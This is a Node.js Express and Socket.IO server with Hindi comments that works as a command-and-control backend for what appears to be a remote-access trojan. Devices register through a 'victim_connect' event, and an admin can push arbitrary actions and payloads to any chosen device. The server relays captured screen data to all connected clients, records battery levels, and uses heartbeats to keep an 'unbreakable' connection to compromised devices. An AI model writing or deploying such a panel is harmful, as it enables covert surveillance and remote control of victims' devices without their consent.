const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    // कनेक्शन को जीवित रखने के लिए पिंग अंतराल और टाइमआउट सेट करें
    pingInterval: 10000, // हर 10 सेकंड में सर्वर एक पिंग भेजेगा
    pingTimeout: 5000,   // अगर 5 सेकंड में पोंग वापस नहीं आता, तो कनेक्शन टूट जाएगा
    transports: ['websocket', 'polling'],
    cors: { origin: "*" }
});

const PORT = process.env.PORT || 8080;

let devices = {};

// केवल मुख्य panel.html को सर्व करें
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Socket.IO लॉजिक
io.on('connection', (socket) => {
    socket.on('admin_join', () => {
        socket.emit('device_list', Object.values(devices));
    });

    socket.on('command_to_device', (data) => {
        const device = devices[data.deviceId];
        if (device && device.socketId) {
            io.to(device.socketId).emit(data.action, data.payload);
        }
    });

    socket.on('victim_connect', (deviceInfo) => {
        devices[deviceInfo.deviceId] = { ...deviceInfo, socketId: socket.id };
        io.emit('new_device_joined', devices[deviceInfo.deviceId]);
    });

    socket.on('screen_data', (data) => {
        io.emit('screen_update', data);
    });

    // =====================================================================
    // मुख्य सुधार: हार्टबीट को सुनना
    // यह सर्वर को जगाए रखेगा
    // =====================================================================
    socket.on('heartbeat', (data) => {
        // बस हार्टबीट प्राप्त करें, कुछ करने की आवश्यकता नहीं है
        // यह ट्रैफिक उत्पन्न करने के लिए पर्याप्त है
        if (data && data.deviceId && devices[data.deviceId]) {
            // आप चाहें तो बैटरी जैसी जानकारी अपडेट कर सकते हैं
            devices[data.deviceId].battery = data.battery;
        }
    });

    socket.on('disconnect', () => {
        let disconnectedDeviceId = null;
        for (const deviceId in devices) {
            if (devices[deviceId].socketId === socket.id) {
                disconnectedDeviceId = deviceId;
                break;
            }
        }
        if (disconnectedDeviceId) {
            delete devices[disconnectedDeviceId];
            io.emit('device_disconnected', disconnectedDeviceId);
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 सर्वर पोर्ट ${PORT} पर "अटूट कनेक्शन" मोड में तैयार है!`);
});
